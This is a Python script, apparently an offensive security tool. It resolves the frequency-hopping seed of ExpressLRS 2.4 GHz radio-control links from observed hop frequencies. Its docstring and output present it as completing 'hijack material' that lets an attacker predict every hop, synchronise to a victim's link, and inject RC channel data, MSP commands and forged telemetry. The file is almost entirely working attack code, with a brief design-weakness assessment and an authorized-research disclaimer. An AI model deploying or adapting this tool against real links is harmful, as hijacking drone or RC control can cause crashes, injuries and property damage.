#!/usr/bin/env python3
"""
ELRS FHSS Seed Resolver — narrow 256 candidate seeds to 1 using observed hops

Given UID[3:5] from the binding-phrase cracker (which fixes CRC init and
leaves 256 possible FHSS seeds, one per UID[2] value), this tool resolves
the single correct seed by matching observed hop frequencies against all
256 candidate FHSS sequences.

Attack premise:
  After the binding-phrase cracker determines UID[3:5] and enumerates
  256 candidate seeds, the attacker passively observes 2+ consecutive
  hop frequencies (e.g. via SDR). Each candidate seed generates a unique
  240-hop FHSS sequence. By matching the observed frequency pair against
  all 256 sequences, the correct UID[2] (and thus the full FHSS seed)
  is identified — completing the session hijack material.

  With the full FHSS seed + CRC init, the attacker can:
    - Predict every future hop frequency
    - Synchronize to the FHSS sequence
    - Inject valid RC channel data
    - Inject MSP commands via CRSF
    - Forge telemetry packets

Input modes:
  --observe: provide 2+ consecutive frequencies in MHz (e.g. "2445,2467")
  --observe-channels: provide 2+ consecutive channel indices (0-79)
  --sequence-position: if known, the position in the FHSS sequence

Usage:
  # Resolve from 2 observed consecutive hop frequencies
  python3 elrs-fhss-seed-resolve.py --target 11:18:5b \\
      --observe 2445.4,2467.4

  # Resolve from channel indices
  python3 elrs-fhss-seed-resolve.py --target 11:18:5b \\
      --observe-channels 45,67

  # Show all 256 candidate sequences (analysis mode)
  python3 elrs-fhss-seed-resolve.py --target 11:18:5b --enumerate

  # Demonstrate resolution with simulated observation
  python3 elrs-fhss-seed-resolve.py --target 11:18:5b --demo

For authorized security research and CTF use only.
"""

import argparse
import json
import math
import os
import sys
import time

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# FHSS parameters (Betaflight 4.4.2 / ELRS v3, SX1280 2.4 GHz)
# ---------------------------------------------------------------------------

FREQ_COUNT = 80
SEQUENCE_COUNT = 240  # (256 / 80) * 80
SYNC_CHANNEL = 41     # (80 / 2) + 1
FIRST_HZ = 2_400_400_000   # 2400.4 MHz
STEP_HZ = 1_000_000        # 1 MHz per channel
DEFAULT_OTA_VERSION = 3


def channel_to_freq_hz(ch: int) -> int:
    return FIRST_HZ + ch * STEP_HZ


def freq_hz_to_channel(freq_hz: float, tolerance_hz: float = 500_000) -> int:
    ch = round((freq_hz - FIRST_HZ) / STEP_HZ)
    if not 0 <= ch < FREQ_COUNT:
        raise ValueError(f"Frequency {freq_hz/1e6:.1f} MHz outside 2.4 GHz ELRS band")
    if abs(freq_hz - channel_to_freq_hz(ch)) > tolerance_hz:
        raise ValueError(f"Frequency {freq_hz/1e6:.1f} MHz not within {tolerance_hz/1e3:.0f} kHz of channel {ch}")
    return ch


def build_fhss_sequence(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> list[int]:
    """Port of Betaflight 4.4.2 fhssGenSequence for SX1280 80-channel domain."""
    seed = (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_ver)

    sequence = []
    for i in range(SEQUENCE_COUNT):
        if i % FREQ_COUNT == 0:
            sequence.append(SYNC_CHANNEL)
        elif i % FREQ_COUNT == SYNC_CHANNEL:
            sequence.append(0)
        else:
            sequence.append(i % FREQ_COUNT)

    for i in range(SEQUENCE_COUNT):
        if i % FREQ_COUNT == 0:
            continue
        seed = (214013 * seed + 2531011) % 2147483648
        offset = (i // FREQ_COUNT) * FREQ_COUNT
        other = offset + ((seed >> 16) % (FREQ_COUNT - 1)) + 1
        sequence[i], sequence[other] = sequence[other], sequence[i]

    return sequence


def uid_to_fhss_seed(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_ver)


def uid_to_crc_init(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
    init = (uid[4] << 8) | uid[5]
    if ota_ver <= 3:
        return (init ^ ota_ver) & 0xFFFF
    return (init ^ (ota_ver << 8)) & 0xFFFF


def parse_target(target_str: str) -> bytes:
    parts = target_str.strip().upper().replace("-", ":").replace(" ", ":").split(":")
    if len(parts) != 3:
        raise ValueError("Target must be 3 bytes UID[3]:UID[4]:UID[5]")
    return bytes(int(p, 16) for p in parts)


def find_consecutive_pair_in_sequence(
    seq: list[int], ch_a: int, ch_b: int
) -> list[int]:
    """Find all positions where ch_a is followed by ch_b in the sequence."""
    positions = []
    for i in range(len(seq) - 1):
        if seq[i] == ch_a and seq[i + 1] == ch_b:
            positions.append(i)
    return positions


def find_consecutive_n_in_sequence(
    seq: list[int], channels: list[int]
) -> list[int]:
    """Find all positions where the channel sequence matches."""
    n = len(channels)
    positions = []
    for i in range(len(seq) - n + 1):
        if seq[i:i + n] == channels:
            positions.append(i)
    return positions


def resolve_seed(
    target: bytes, observed_channels: list[int], ota_ver: int, verbose: bool = False
) -> list[dict]:
    """Try all 256 UID[2] candidates and return those matching the observation."""
    uid3, uid4, uid5 = target
    matches = []
    t0 = time.monotonic()

    for uid2 in range(256):
        uid = bytes([0, 0, uid2, uid3, uid4, uid5])
        seq = build_fhss_sequence(uid, ota_ver)

        positions = find_consecutive_n_in_sequence(seq, observed_channels)
        if positions:
            fhss_seed = uid_to_fhss_seed(uid, ota_ver)
            matches.append({
                "uid2": uid2,
                "fhss_seed": fhss_seed,
                "fhss_seed_hex": f"0x{fhss_seed:08x}",
                "positions": positions,
                "sequence_preview": seq[:20],
            })
            if verbose:
                print(f"  [MATCH] UID[2]=0x{uid2:02x} seed=0x{fhss_seed:08x} "
                      f"at position(s) {positions}")

    elapsed = time.monotonic() - t0
    if verbose:
        print(f"  Checked 256 candidates in {elapsed:.3f}s")

    return matches


def main():
    parser = argparse.ArgumentParser(
        description="ELRS FHSS Seed Resolver — narrow 256 seeds to 1"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target UID[3]:UID[4]:UID[5] (hex, colon-separated)",
    )
    parser.add_argument(
        "--observe",
        help="Observed consecutive frequencies in MHz, comma-separated "
             "(e.g. '2445.4,2467.4')",
    )
    parser.add_argument(
        "--observe-channels",
        help="Observed consecutive channel indices, comma-separated "
             "(e.g. '45,67')",
    )
    parser.add_argument(
        "--enumerate", action="store_true",
        help="Show all 256 candidate FHSS sequences (first 20 hops each)",
    )
    parser.add_argument(
        "--demo", action="store_true",
        help="Demonstrate resolution using a simulated observation "
             "(picks UID[2]=0x42 and extracts 2 hops from its sequence)",
    )
    parser.add_argument(
        "--ota-version", type=int, default=DEFAULT_OTA_VERSION, choices=[3, 4],
        help="OTA version ID (default: %(default)s)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    target = parse_target(args.target)
    ota_ver = args.ota_version
    uid3, uid4, uid5 = target
    target_hex = f"{uid3:02x}:{uid4:02x}:{uid5:02x}"

    crc_init = uid_to_crc_init(bytes([0, 0, 0, uid3, uid4, uid5]), ota_ver)

    print("ELRS FHSS Seed Resolver")
    print(f"Target UID[3:5]: {target_hex}")
    print(f"CRC init (fixed): 0x{crc_init:04x}")
    print(f"OTA version: {ota_ver}")
    print(f"Candidate seeds: 256 (one per UID[2] value)")
    print()

    results = {
        "target": target_hex,
        "ota_version": ota_ver,
        "crc_init": crc_init,
        "crc_init_hex": f"0x{crc_init:04x}",
    }

    # --- Enumerate mode ---
    if args.enumerate:
        print(f"{'UID[2]':>8}  {'FHSS Seed':>12}  First 20 hops (channel indices)")
        print("-" * 80)
        for uid2 in range(256):
            uid = bytes([0, 0, uid2, uid3, uid4, uid5])
            seq = build_fhss_sequence(uid, ota_ver)
            seed = uid_to_fhss_seed(uid, ota_ver)
            hops = " ".join(f"{ch:2d}" for ch in seq[:20])
            print(f"  0x{uid2:02x}    0x{seed:08x}   {hops}")
        print(f"\n256 sequences enumerated.")
        results["mode"] = "enumerate"

    # --- Demo mode ---
    if args.demo:
        demo_uid2 = 0x42
        demo_uid = bytes([0, 0, demo_uid2, uid3, uid4, uid5])
        demo_seq = build_fhss_sequence(demo_uid, ota_ver)
        demo_seed = uid_to_fhss_seed(demo_uid, ota_ver)

        # Pick 2 consecutive non-sync hops from position 5
        pos = 5
        while pos < len(demo_seq) - 1:
            if demo_seq[pos] != SYNC_CHANNEL and demo_seq[pos + 1] != SYNC_CHANNEL:
                break
            pos += 1

        obs_ch = [demo_seq[pos], demo_seq[pos + 1]]
        obs_freq = [channel_to_freq_hz(ch) / 1e6 for ch in obs_ch]

        print(f"{'=' * 60}")
        print("DEMO: Simulated FHSS observation")
        print(f"{'=' * 60}")
        print(f"  Simulated UID[2] = 0x{demo_uid2:02x}")
        print(f"  True FHSS seed   = 0x{demo_seed:08x}")
        print(f"  Observed hops at position {pos},{pos+1}:")
        print(f"    Channel {obs_ch[0]} ({obs_freq[0]:.1f} MHz) → "
              f"Channel {obs_ch[1]} ({obs_freq[1]:.1f} MHz)")
        print()

        matches = resolve_seed(target, obs_ch, ota_ver, verbose=True)

        print(f"\n  Matches: {len(matches)}")
        if len(matches) == 1:
            m = matches[0]
            print(f"  RESOLVED: UID[2] = 0x{m['uid2']:02x}, "
                  f"FHSS seed = {m['fhss_seed_hex']}")
            print(f"  Full hijack material is now complete.")
        elif len(matches) > 1:
            print(f"  {len(matches)} candidates remain — need more observations.")
            print(f"  (With 3+ observed hops, resolution to 1 is near-certain)")

        results["demo"] = {
            "simulated_uid2": demo_uid2,
            "observed_channels": obs_ch,
            "matches": len(matches),
            "resolved": len(matches) == 1,
        }

    # --- Resolve from real observation ---
    observed_channels = None

    if args.observe:
        freqs_mhz = [float(f.strip()) for f in args.observe.split(",")]
        observed_channels = [freq_hz_to_channel(f * 1e6) for f in freqs_mhz]
        print(f"Observed frequencies: {', '.join(f'{f:.1f} MHz' for f in freqs_mhz)}")
        print(f"Mapped to channels:  {observed_channels}")

    elif args.observe_channels:
        observed_channels = [int(c.strip()) for c in args.observe_channels.split(",")]
        freqs_mhz = [channel_to_freq_hz(ch) / 1e6 for ch in observed_channels]
        print(f"Observed channels: {observed_channels}")
        print(f"Frequencies:       {', '.join(f'{f:.1f} MHz' for f in freqs_mhz)}")

    if observed_channels is not None:
        if len(observed_channels) < 2:
            print("ERROR: need at least 2 consecutive observations")
            return 1

        print(f"\nResolving against 256 candidate sequences...")
        matches = resolve_seed(target, observed_channels, ota_ver, verbose=True)

        results["observation"] = {
            "channels": observed_channels,
            "match_count": len(matches),
            "matches": matches,
        }

        print(f"\n{'=' * 60}")
        if len(matches) == 0:
            print("NO MATCH — observation doesn't match any candidate.")
            print("Check: correct UID[3:5]? correct OTA version? consecutive hops?")
        elif len(matches) == 1:
            m = matches[0]
            print(f"RESOLVED: Single match found!")
            print(f"{'=' * 60}")
            print(f"  UID[2]:      0x{m['uid2']:02x}")
            print(f"  FHSS seed:   {m['fhss_seed_hex']}")
            print(f"  CRC init:    0x{crc_init:04x}")
            print(f"  Sequence position: {m['positions']}")
            print()
            print(f"  Complete hijack material:")
            print(f"    - Full FHSS sequence: KNOWN (all 240 hops predictable)")
            print(f"    - CRC init: 0x{crc_init:04x}")
            print(f"    - Can predict every future hop frequency")
            print(f"    - Can synchronize TX to victim's FHSS pattern")
            print(f"    - Can inject RC channels, MSP commands, telemetry")
        else:
            print(f"NARROWED: {len(matches)} candidates remain (from 256)")
            print(f"{'=' * 60}")
            for m in matches:
                print(f"  UID[2]=0x{m['uid2']:02x}  seed={m['fhss_seed_hex']}  "
                      f"pos={m['positions']}")
            print(f"\n  Observe {len(observed_channels) + 1}+ consecutive hops "
                  f"to narrow further.")

    # --- Assessment ---
    if not args.enumerate:
        print(f"\n{'=' * 60}")
        print("ASSESSMENT")
        print(f"{'=' * 60}")
        print(f"  The FHSS sequence is generated from a 32-bit seed derived")
        print(f"  from the UID. With UID[3:5] known, only UID[2] varies,")
        print(f"  giving 256 candidate seeds. The PRNG (LCG: x = 214013*x")
        print(f"  + 2531011 mod 2^31) produces a unique 240-hop permutation")
        print(f"  per seed. Two consecutive observed frequencies typically")
        print(f"  resolve to a single seed.")
        print()
        print(f"  This is a fundamental design weakness: the FHSS sequence")
        print(f"  is not a secret once the UID is known, and the UID is")
        print(f"  transmitted in cleartext in every SYNC packet.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
